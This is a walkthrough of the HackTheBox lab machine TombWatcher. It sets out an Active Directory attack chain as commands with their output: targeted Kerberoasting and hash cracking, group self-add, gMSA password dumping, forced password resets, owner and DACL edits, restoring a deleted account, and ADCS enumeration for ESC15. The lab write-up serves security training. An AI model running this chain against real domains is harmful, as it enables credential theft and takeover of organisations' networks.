---
title: "HTB Machine : TombWatcher"
description: Walkthrough of the HTB TombWatcher machine, covering initial access with domain creds, BloodHound ACL abuse, targeted Kerberoasting, and privilege escalation via ADCS ESC15 to Domain Admin.
image: /images/TombWatcher/TombWatcher.png
date: 2025-06-10 20:00:00 +/-TTTT
categories: [HTB]
tags: [HTB, Windows, ADCS, ESC15, pentest, Active Directory ]
---

### Nmap Scan
```sh
$ nmap -sV -sC 10.10.11.72
# Nmap 7.95 scan initiated Tue Jun 10 15:30:06 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -oN nmap.txt 10.10.11.72
Nmap scan report for 10.10.11.72
Host is up (0.10s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-10 17:30:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T17:32:04+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-10T17:32:04+00:00; +4h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T17:32:04+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-10T17:32:04+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2025-06-10T17:31:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 10 15:32:05 2025 -- 1 IP address (1 host up) scanned in 119.07 seconds

```

### BloodHound enumeration

```sh
$ faketime "$( ntpdate -q 10.10.11.72 | awk '/^[0-9]/ { print $1" "$2; exit }')"    bloodhound-python -u 'henry' -p 'H3nry_987TGV!'   -d tombwatcher.htb -ns 10.10.11.72 -c all --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 00M 32S
INFO: Compressing output into 20250610193746_bloodhound.zip
```

#### Write SPN

The user HENRY@TOMBWATCHER.HTB has the ability to write to the "serviceprincipalname" attribute to the user ALFRED@TOMBWATCHER.HTB.
![WriteSPN](/images/TombWatcher/writespn.png)

#### Exploit
```bash
$ faketime "$( ntpdate -q 10.10.11.72 | awk '/^[0-9]/ { print $1" "$2; exit }')"    python3 /opt/targetedKerberoast/targetedKerberoast.py -v -u 'henry' -p 'H3nry_987TGV!'   -d tombwatcher.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$3605b94a7dd8f1485ee7c10965a55fbd$73cd728f94e8af505e51efb48500a8a5a64eb34ec98c2d44b4af4c57ba78946ac9f9627210b55e9618963fb62813ee9a3b104f664bb84d4f98414ae1e8bcecd4b99506c94152117e4db85369a367d6e9e3778f345d926e06c841947f07eedd853d5999f8b6eeb31b2920ce7ad2c6f21e0af469860d3433698f2d7fcfa6cbd59a031eab5b173826e899c9a7ab0fe0c01b58005a4237a2dde9f2a6f7762b82ea5edf7113fb1c1399ba33bbcff36c1ca179f0bd1cc4a514a78bbca36de45f816a6cb24a3e2d6d2d2cdd132ebc4a6b1fc1340f3b85734b5e19635a75cdc0ddf909bb8a0b2c6b599f358e480ff1570f2d962ceed8f2c1805e17671c63f9f9a3837e2bea19c57a458e3f62dcd976f6810909a3b8e12ae7293875c1332b43ab5c2ccd5ceb1852f29603c43983aead5f43b002f2fce3b090139502ef6f13e8472bcf114e697b6fea0f5122b5280542f6f62da7a5b16897f367e3efa80442f51df32f91ff7d1c58cd9ab4a6ebd2d35a719f1ba2376f37092e8e38d138e9bd2374dd3e81bc6aa96eb542e6c93832c8ad0b828cf0899916240f2f7014e4c9e71791fd1b7f75d5ee3e89386e6722bd38800b35170dc15209dd933a7612285a8ca848c29869ac52c14653bad403a5833fe045e2725bb56bf1615c99c2c461a33246cab4d2a63f1f632954868636bb64433a1211f8203edbdd6207d6ad06fef95e638efe8b80b5fef5c741e4a3940fa577a4ba1b018e96cbaf9df0838cc5ad72563d9c0a1e52ca12fe74b83c290dbfc3242c644dd418de516112182fd03ac544187d379506662ef6fdddd61c00b9214b2756eebbee04522007176790e69adcd9a1b74c09b96aa168f3b12ada1b93e9999330b6359ba2d15dd7a67c4e7e21ccff10d9292164bce4a2684aef7a1b3756f68f063065cbef0535a092ab8989f4abe5dbddc39d12e7b6390eecd82b1a3875cc0cc7d923059e233faafa96dea6dbbc56ad0b30477bf3c50cf7f33d4f7b9e8b11a4ac36d1cd45ab296956a759a08f5e8579c08bdbf3da4669d7e8bb18d1db3d55f51ed944fe9165880477d42ee79649d89d141188800a0d658491f5b6ced7c82571f4bdeaf8b637f900a1c0036a16aec7a466df66d62c5cd09fed4d8a91af72662daa3ac6007c6ac0537662a295879062e6f6c2a80f7f219e958f9aa28eecd687ed6e04d7aacfb4c7b2ad437c73a3601644f16ca57f1b5f073a53dd952c063ad0a8a257e6450b9d4b9194b191c336b937a69638373e51a6fd68de47148c335f467919734726a8938d090cd3107b0ce9243e681dbc546fc2833a44be9a6155e736081fc477666ba42cec8659fd63b8d71965788fe5e5cd9115238ef0c3ae6797a9de22a1b1864afd4212eadfe03218a1a655266fa7b3c34a2972fc6b4e063ee6971396074f6c75160380c734d06cffe1e28ad37d9405b6eef457c2c605f2ce24411b80adda56cd0b0e752e6c64
```

#### Cracking the krbgt Hash

```sh
$ hashcat -m 13100 alfred.hash /opt/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 5 5500U with Radeon Graphics, 1250/2565 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$3605b94a7dd8f1485ee7c10965a55fbd$73cd728f94e8af505e51efb48500a8a5a64eb34ec98c2d44b4af4c57ba78946ac9f9627210b55e9618963fb62813ee9a3b104f664bb84d4f98414ae1e8bcecd4b99506c94152117e4db85369a367d6e9e3778f345d926e06c841947f07eedd853d5999f8b6eeb31b2920ce7ad2c6f21e0af469860d3433698f2d7fcfa6cbd59a031eab5b173826e899c9a7ab0fe0c01b58005a4237a2dde9f2a6f7762b82ea5edf7113fb1c1399ba33bbcff36c1ca179f0bd1cc4a514a78bbca36de45f816a6cb24a3e2d6d2d2cdd132ebc4a6b1fc1340f3b85734b5e19635a75cdc0ddf909bb8a0b2c6b599f358e480ff1570f2d962ceed8f2c1805e17671c63f9f9a3837e2bea19c57a458e3f62dcd976f6810909a3b8e12ae7293875c1332b43ab5c2ccd5ceb1852f29603c43983aead5f43b002f2fce3b090139502ef6f13e8472bcf114e697b6fea0f5122b5280542f6f62da7a5b16897f367e3efa80442f51df32f91ff7d1c58cd9ab4a6ebd2d35a719f1ba2376f37092e8e38d138e9bd2374dd3e81bc6aa96eb542e6c93832c8ad0b828cf0899916240f2f7014e4c9e71791fd1b7f75d5ee3e89386e6722bd38800b35170dc15209dd933a7612285a8ca848c29869ac52c14653bad403a5833fe045e2725bb56bf1615c99c2c461a33246cab4d2a63f1f632954868636bb64433a1211f8203edbdd6207d6ad06fef95e638efe8b80b5fef5c741e4a3940fa577a4ba1b018e96cbaf9df0838cc5ad72563d9c0a1e52ca12fe74b83c290dbfc3242c644dd418de516112182fd03ac544187d379506662ef6fdddd61c00b9214b2756eebbee04522007176790e69adcd9a1b74c09b96aa168f3b12ada1b93e9999330b6359ba2d15dd7a67c4e7e21ccff10d9292164bce4a2684aef7a1b3756f68f063065cbef0535a092ab8989f4abe5dbddc39d12e7b6390eecd82b1a3875cc0cc7d923059e233faafa96dea6dbbc56ad0b30477bf3c50cf7f33d4f7b9e8b11a4ac36d1cd45ab296956a759a08f5e8579c08bdbf3da4669d7e8bb18d1db3d55f51ed944fe9165880477d42ee79649d89d141188800a0d658491f5b6ced7c82571f4bdeaf8b637f900a1c0036a16aec7a466df66d62c5cd09fed4d8a91af72662daa3ac6007c6ac0537662a295879062e6f6c2a80f7f219e958f9aa28eecd687ed6e04d7aacfb4c7b2ad437c73a3601644f16ca57f1b5f073a53dd952c063ad0a8a257e6450b9d4b9194b191c336b937a69638373e51a6fd68de47148c335f467919734726a8938d090cd3107b0ce9243e681dbc546fc2833a44be9a6155e736081fc477666ba42cec8659fd63b8d71965788fe5e5cd9115238ef0c3ae6797a9de22a1b1864afd4212eadfe03218a1a655266fa7b3c34a2972fc6b4e063ee6971396074f6c75160380c734d06cffe1e28ad37d9405b6eef457c2c605f2ce24411b80adda56cd0b0e752e6c64:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...2e6c64
Time.Started.....: Tue Jun 10 15:53:45 2025 (1 sec)
Time.Estimated...: Tue Jun 10 15:53:46 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    74798 H/s (2.14ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany
Hardware.Mon.#1..: Util: 36%

Started: Tue Jun 10 15:53:24 2025
Stopped: Tue Jun 10 15:53:47 2025
                                           
```
we found our first credentiels : `alfred:basketball`
```sh
$ nxc smb 10.10.11.72 -u 'alfred' -p 'basketball'
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\alfred:basketball 
                     
```

#### Addself

The user ALFRED@TOMBWATCHER.HTB has the ability to add itself, to the group INFRASTRUCTURE@TOMBWATCHER.HTB. Because of security group delegation, the members of a security group have the same privileges as that group.

By adding itself to the group, ALFRED@TOMBWATCHER.HTB will gain the same privileges that INFRASTRUCTURE@TOMBWATCHER.HTB already has.

![addself](/images/TombWatcher/addself.png)

##### Exploit
```sh
$ bloodyAD   --host 10.10.11.72 -d tombwatcher.htb  -u 'alfred' -p 'basketball'  add groupMember  'CN=INFRASTRUCTURE,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'CN=ALFRED,CN=USERS,DC=TOMBWATCHER,DC=HTB' 
[+] CN=ALFRED,CN=USERS,DC=TOMBWATCHER,DC=HTB added to CN=INFRASTRUCTURE,CN=USERS,DC=TOMBWATCHER,DC=HTB

```

##### ReadGMSAPassword

ANSIBLE_DEV$@TOMBWATCHER.HTB is a Group Managed Service Account. The group INFRASTRUCTURE@TOMBWATCHER.HTB can retrieve the password for the GMSA ANSIBLE_DEV$@TOMBWATCHER.HTB.

Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).

The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.

![ReadGMSAPassword](/images/TombWatcher/ReadGMSAPassword.png)

```bash
$ python3 /opt/gMSADumper/gMSADumper.py  -d tombwatcher.htb -u 'alfred' -p 'basketball' 
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a

```
We get NTLM hash of `ansible_dev$` 

#### ForceChangePassword
The user ANSIBLE_DEV$@TOMBWATCHER.HTB has the capability to change the user SAM@TOMBWATCHER.HTB's password without knowing that user's current password.

![ForceChangePassword](/images/TombWatcher/ForceChangePassword.png)
```sh
$ bloodyAD   --host 10.10.11.72 -d tombwatcher.htb  -u 'ansible_dev$' -p :1c37d00093dc2a5f25176bf2d474afdc  set password 'CN=SAM,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'newp@ss'
[+] Password changed successfully!
```
##### WriteOwner
The user SAM@TOMBWATCHER.HTB has the ability to modify the owner of the user JOHN@TOMBWATCHER.HTB.

Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.
![WriteOwner](/images/TombWatcher/WriteOwner.png)

We start changing the owner to `sam`
```sh
$ impacket-owneredit -action write -new-owner 'sam' -target  'john'  'tombwatcher/sam:newp@ss' -dc-ip 10.10.11.72 
/usr/share/doc/python3-impacket/examples/owneredit.py:87: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/share/doc/python3-impacket/examples/owneredit.py:96: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/share/doc/python3-impacket/examples/owneredit.py:97: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/share/doc/python3-impacket/examples/owneredit.py:98: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/share/doc/python3-impacket/examples/owneredit.py:100: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/share/doc/python3-impacket/examples/owneredit.py:101: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/share/doc/python3-impacket/examples/owneredit.py:102: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/share/doc/python3-impacket/examples/owneredit.py:103: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/share/doc/python3-impacket/examples/owneredit.py:104: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/share/doc/python3-impacket/examples/owneredit.py:105: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/share/doc/python3-impacket/examples/owneredit.py:106: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/share/doc/python3-impacket/examples/owneredit.py:107: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/share/doc/python3-impacket/examples/owneredit.py:108: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/share/doc/python3-impacket/examples/owneredit.py:109: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/share/doc/python3-impacket/examples/owneredit.py:110: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/share/doc/python3-impacket/examples/owneredit.py:111: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/share/doc/python3-impacket/examples/owneredit.py:112: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/share/doc/python3-impacket/examples/owneredit.py:113: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[*] - sAMAccountName: sam
[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```
Then we give `sam` a `FullControl` of `John` account 
```sh
$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam'  -target-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'sam':'newp@ss' -dc-ip 10.10.11.72 
/usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/share/doc/python3-impacket/examples/dacledit.py:110: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:112: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/share/doc/python3-impacket/examples/dacledit.py:114: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:115: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:116: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/share/doc/python3-impacket/examples/dacledit.py:117: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:118: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/share/doc/python3-impacket/examples/dacledit.py:121: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:123: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:124: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:125: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/share/doc/python3-impacket/examples/dacledit.py:126: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:127: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250610-164017.bak
[*] DACL modified successfully!
                               
```
Using this power we can change John's password 

```sh
$ bloodyAD   --host 10.10.11.72 -d tombwatcher.htb  -u 'sam' -p 'newp@ss'  set password 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'newp@ss' 
[+] Password changed successfully!
```
![remote management group](/images/TombWatcher/remoteManagement.png)

John is a member of remote management group , we can do a remote connection and retreive the `user.txt` flag.

```sh
$ evil-winrm  -u john -p 'newp@ss' -i 10.10.11.72                                              

Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> ls


    Directory: C:\Users\john


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       12/11/2024   6:51 PM                Desktop
d-r---       12/11/2024   6:51 PM                Documents
d-r---        9/15/2018   3:12 AM                Downloads
d-r---        9/15/2018   3:12 AM                Favorites
d-r---        9/15/2018   3:12 AM                Links
d-r---        9/15/2018   3:12 AM                Music
d-r---        9/15/2018   3:12 AM                Pictures
d-----        9/15/2018   3:12 AM                Saved Games
d-r---        9/15/2018   3:12 AM                Videos

```
### Privilege escalation:

Using `BloodHound` we enumarate again the domain but using John's credentials.

### GenericAll
The user JOHN@TOMBWATCHER.HTB has GenericAll privileges to the OU ADCS@TOMBWATCHER.HTB.
This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.

![GenericAll](/images/TombWatcher/GenericAll.png)

```sh
$ impacket-dacledit -action write -rights FullControl -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' 'tombwatcher.htb'/'john':'newp@ss' -dc-ip 10.10.11.72
/usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/share/doc/python3-impacket/examples/dacledit.py:110: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:112: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/share/doc/python3-impacket/examples/dacledit.py:114: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:115: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:116: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/share/doc/python3-impacket/examples/dacledit.py:117: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:118: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/share/doc/python3-impacket/examples/dacledit.py:121: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:123: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:124: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:125: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/share/doc/python3-impacket/examples/dacledit.py:126: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:127: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250610-171335.bak
[*] DACL modified successfully!

```
This command gives John the full control right on the ADCS OU .

```bash
evil-winrm -u john -p 'newp@ss' -i 10.10.11.72
```


## Active Directory Recycle Bin Enumeration

Once inside the machine as `john`, we leveraged PowerShell to look for deleted Active Directory (AD) objects:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
```

> This command checks for **soft-deleted** user objects in AD. We found multiple deleted instances of a user named `cert_admin` under the `OU=ADCS` organizational unit.

---

## Restoring a Deleted AD User

We proceeded to restore the last instance of the deleted `cert_admin` object:

```powershell
Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "newp@ss" -Force)
Enable-ADAccount -Identity cert_admin
```

> We reset the password and enabled the `cert_admin` account, giving us a new foothold with a potentially more privileged user.

---

## Certificate Authority Enumeration (Certipy)

Using `certipy`, we scanned the AD Certificate Services setup for misconfigurations and vulnerable templates:

```bash
faketime "$( ntpdate -q 10.10.11.72 | awk '/^[0-9]/ { print $1" "$2; exit }')" \
certipy-ad find -u 'cert_admin' -p 'newp@ss' -dc-ip 10.10.11.72 -vulnerable -stdout -text
```

> The `faketime` utility was used to simulate synchronized time in case the system time was skewed. This is necessary for Kerberos and certificate-based operations to function properly.

Certipy output showed that the `WebServer` template was:

* **Enabled**
* **Allows enrollee to supply subject name**
* **Accessible by `cert_admin`**
* Vulnerable to **ESC15** (EnrolleeSuppliesSubject abuse)

